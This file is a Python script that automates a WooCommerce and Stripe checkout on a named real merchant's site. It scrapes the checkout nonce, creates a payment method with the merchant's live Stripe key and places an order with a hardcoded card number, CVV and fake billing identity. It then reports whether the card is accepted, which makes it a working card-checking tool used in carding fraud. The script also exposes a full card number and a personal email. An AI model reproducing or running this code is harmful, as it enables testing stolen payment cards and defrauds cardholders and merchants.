from datetime import datetime as d
from bs4 import BeautifulSoup as bs
from httpx import AsyncClient as asx
import asyncio
import json

async def chkcc():
    # Use hardcoded card for testing
    cc, mm, yy, cvv = "5178059457212158", "11", "25", "039"
    print(f"Using card: {cc}|{mm}|{yy}|{cvv}")
    
    last4 = cc[-4:]
    if len(yy) == 4 and yy.startswith('20'):
        yy = yy[2:]
    if len(mm) == 1:
        mm = '0' + mm
    
    yyx = '20'+yy
    if d(int(yyx),int(mm),1)>=d.today().replace(day=1):
        async with asx(timeout=30) as s:  # Removed proxy parameter
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Alt-Used': 'dragonworksperformance.com',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
            }
            print("Making initial request to add to cart...")
            req1 = await s.get(
                'https://dragonworksperformance.com/product-category/category/vehicle-accessories/?add-to-cart=316105',
                headers=headers,
            )
            print(f"Initial request status: {req1.status_code}")
            print(f"Initial request URL: {req1.url}")

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Alt-Used': 'dragonworksperformance.com',
                'Connection': 'keep-alive',
                'Referer': 'https://dragonworksperformance.com/cart/',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Priority': 'u=0, i',
            }
            print("Making checkout page request...")
            req2 = await s.get('https://dragonworksperformance.com/checkout/', headers=headers)
            print(f"Checkout request status: {req2.status_code}")
            print(f"Checkout request URL: {req2.url}")
            print(f"Checkout response text (first 500 chars): {req2.text[:500]}")

            sp = bs(req2.text, 'html.parser')
            nnce = sp.find('input', id="woocommerce-process-checkout-nonce")
            if nnce:
                nnce = nnce['value']
                print(f"Found nonce: {nnce}")
            else:
                print("ERROR: Could not find nonce in checkout page")
                return "Nonce not found"

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Priority': 'u=4',
            }
            data = {
                "billing_details[name]": "Dark LuCfer",
                "billing_details[email]": "ubetatta@gmail.com",
                "billing_details[phone]": "(08) 9192 3233",
                "billing_details[address][city]": "Memphis",
                "billing_details[address][country]": "LK",
                "billing_details[address][line1]": "1377 Lightning Point Drive",
                "billing_details[address][line2]": "",
                "billing_details[address][postal_code]": "34747",
                "billing_details[address][state]": "",
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/3f3206635f; stripe-js-v3/3f3206635f; payment-element; deferred-intent",
                "referrer": 'https://dragonworksperformance.com',
                "time_on_page": "358784",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "guid": "390bb05d-b21c-4943-8b30-3c680b27c56e59fa53",
                "muid": "0d427180-085c-4fc5-9270-5a52a7e82fe3c8bfa9",
                "sid": "e562860e-07b4-4ce2-bc73-79b0b58f65648f8bdf",
                "key": "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN",
                "_stripe_version": "2024-06-20"
            }
            print("Making Stripe payment method request...")
            req3 = await s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            print(f"Stripe request status: {req3.status_code}")
            print(f"Stripe response: {req3.text}")
            
            if req3.status_code == 200 and 'pm_' in req3.text:
                idx = req3.json().get('id')
                print(f"Payment method ID: {idx}")

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://dragonworksperformance.com',
                    'Alt-Used': 'dragonworksperformance.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://dragonworksperformance.com/checkout/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                }
                data = {
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "(none)",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": "https://dragonworksperformance.com/my-account/",
                    "wc_order_attribution_session_start_time": "2025-07-31 20:21:56",
                    "wc_order_attribution_session_pages": "14",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
                    "billing_first_name": "Dark",
                    "billing_last_name": "LuCfer",
                    "billing_company": "",
                    "billing_country": "LK",
                    "billing_address_1": "1377 Lightning Point Drive",
                    "billing_address_2": "",
                    "billing_city": "Memphis",
                    "billing_state": "",
                    "billing_postcode": "34747",
                    "billing_phone": "(08) 9192 3233",
                    "billing_email": "ubetatta@gmail.com",
                    "shipping_first_name": "Dark",
                    "shipping_last_name": "LuCfer",
                    "shipping_company": "",
                    "shipping_country": "LK",
                    "shipping_address_1": "1377 Lightning Point Drive",
                    "shipping_address_2": "",
                    "shipping_city": "Memphis",
                    "shipping_state": "",
                    "shipping_postcode": "34747",
                    "shipping_phone": "(08) 9192 3233",
                    "order_comments": "",
                    "4cBzr": "",
                    "shipping_method[0]": "flat_rate:2",
                    "coupon_code": "",
                    "payment_method": "stripe",
                    "wc-stripe-payment-method-upe": "",
                    "wc_stripe_selected_upe_payment_type": "",
                    "wc-stripe-is-deferred-intent": "1",
                    "terms": "on",
                    "terms-field": "1",
                    "woocommerce-process-checkout-nonce": nnce,
                    "_wp_http_referer": "https://dragonworksperformance.com/checkout/?elementorPageId=680&elementorWidgetId=741b8cf",
                    "zerospam_david_walsh_key": 'MZeaD',
                    "wc-stripe-payment-method": idx,
                }
                print("Making final checkout request...")
                req4 = await s.post('https://dragonworksperformance.com/?wc-ajax=checkout', headers=headers, data=data)
                print(f"Final checkout status: {req4.status_code}")
                print(f"Final checkout response: {req4.text}")
                
                if 'messages' in req4.text:
                    try:
                        response_json = req4.json()
                        soup = bs(response_json['messages'], 'html.parser')
                        result = soup.get_text(strip=True)
                        print(f"Result: {result}")
                        return result
                    except Exception as e:
                        print(f"Error parsing response: {e}")
                        return f"Error parsing response: {e}"
                else:
                    return "No messages in response"
            else:
                # Fix the error handling to properly extract the error message
                try:
                    error_data = req3.json()
                    error_message = error_data.get('error', {}).get('message', 'Unknown error occurred')
                    print(f"Stripe error: {error_message}")
                    return f"Error: {error_message}"
                except Exception as e:
                    print(f"Error parsing stripe response: {e}")
                    return f"Error: {req3.text}"
    else:
        return 'invalid expiration date.'

# Test function
async def main():
    result = await chkcc()
    print(f"\nFinal result: {result}")

if __name__ == "__main__":
    asyncio.run(main())